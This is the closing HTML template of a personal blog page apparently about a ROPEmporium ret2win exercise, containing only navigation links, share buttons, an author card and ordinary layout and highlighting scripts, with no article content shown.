                <a class="post-action-btn btn btn--default tooltip--top" href="https://thieunguyen5991.github.io/2019/08/ropemporium-1-split-64-bit/" data-tooltip="ROPEmporium: 1-Split (64-bit)">
              
                  <i class="fa fa-angle-left"></i>
                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
                </a>
            </li>
            <li class="post-action">
              
                <a class="post-action-btn btn btn--default tooltip--top" href="https://thieunguyen5991.github.io/2019/06/voltage-glitching-on-the-cheap/" data-tooltip="Voltage glitching on the cheap">
              
                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
                  <i class="fa fa-angle-right"></i>
                </a>
            </li>
          
        </ul>
      </nav>
    <ul class="post-actions post-action-share" >
      
        <li class="post-action hide-lg hide-md hide-sm">
          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
            <i class="fa fa-share-alt"></i>
          </a>
        </li>
        
          <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://thieunguyen5991.github.io/2019/08/ropemporium-0-ret2win-64-bit/">
              <i class="fa fa-facebook-official"></i>
            </a>
          </li>
        
          <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://thieunguyen5991.github.io/2019/08/ropemporium-0-ret2win-64-bit/">
              <i class="fa fa-twitter"></i>
            </a>
          </li>
        
          <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://thieunguyen5991.github.io/2019/08/ropemporium-0-ret2win-64-bit/">
              <i class="fa fa-google-plus"></i>
            </a>
          </li>
        
      
      
      <li class="post-action">
        
          <a class="post-action-btn btn btn--default" href="#">
        
          <i class="fa fa-list"></i>
        </a>
      </li>
    </ul>
  
</div>

      </div>
      <div id="share-options-bar" class="share-options-bar" data-behavior="5">
  <i id="btn-close-shareoptions" class="fa fa-close"></i>
  <ul class="share-options">
    
      <li class="share-option">
        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fthieunguyen5991.github.io%2F2019%2F08%2Fropemporium-0-ret2win-64-bit%2F">
          <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
        </a>
      </li>
    
      <li class="share-option">
        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fthieunguyen5991.github.io%2F2019%2F08%2Fropemporium-0-ret2win-64-bit%2F">
          <i class="fa fa-twitter"></i><span>Share on Twitter</span>
        </a>
      </li>
    
      <li class="share-option">
        <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3A%2F%2Fthieunguyen5991.github.io%2F2019%2F08%2Fropemporium-0-ret2win-64-bit%2F">
          <i class="fa fa-google-plus"></i><span>Share on Google&#43;</span>
        </a>
      </li>
    
  </ul>
</div>
<div id="share-options-mask" class="share-options-mask"></div>
    </div>
    
    <div id="about">
  <div id="about-card">
    <div id="about-btn-close">
      <i class="fa fa-remove"></i>
    </div>
    
      <img id="about-card-picture" src="https://www.gravatar.com/avatar/435730f573f686aa570b7607ed361ded?s=110" alt="Author&#39;s picture" />
    
    <h4 id="about-card-name">Thieu Nguyen</h4>
    
      <div id="about-card-bio">Knowledge is power, but sharing it is the way to achieve immortality.</div>
    
    
      <div id="about-card-job">
        <i class="fa fa-briefcase"></i>
        <br/>
        Researcher, Programmer, Gamer
      </div>
    
    
      <div id="about-card-location">
        <i class="fa fa-map-marker"></i>
        <br/>
        Germany
      </div>
    
  </div>
</div>

    

    
  
    
      <div id="cover" style="background-image:url('https://thieunguyen5991.github.io/img/side-banner.jpg');"></div>
    
  


    
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin="anonymous"></script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>


<script src="https://thieunguyen5991.github.io/js/script-pcw6v3xilnxydl1vddzazdverrnn9ctynvnxgwho987mfyqkuylcb1nlt.min.js"></script>


<script lang="javascript">
window.onload = updateMinWidth;
window.onresize = updateMinWidth;
document.getElementById("sidebar").addEventListener("transitionend", updateMinWidth);
function updateMinWidth() {
  var sidebar = document.getElementById("sidebar");
  var main = document.getElementById("main");
  main.style.minWidth = "";
  var w1 = getComputedStyle(main).getPropertyValue("min-width");
  var w2 = getComputedStyle(sidebar).getPropertyValue("width");
  var w3 = getComputedStyle(sidebar).getPropertyValue("left");
  main.style.minWidth = `calc(${w1} - ${w2} - ${w3})`;
}
</script>

<script>
$(document).ready(function() {
  hljs.configure({ classPrefix: '', useBR: false });
  $('pre.code-highlight > code, pre > code').each(function(i, block) {
    if (!$(this).hasClass('codeblock')) {
      $(this).addClass('codeblock');
    }
    hljs.highlightBlock(block);
  });
});
</script>


  




    
  </body>
</html>

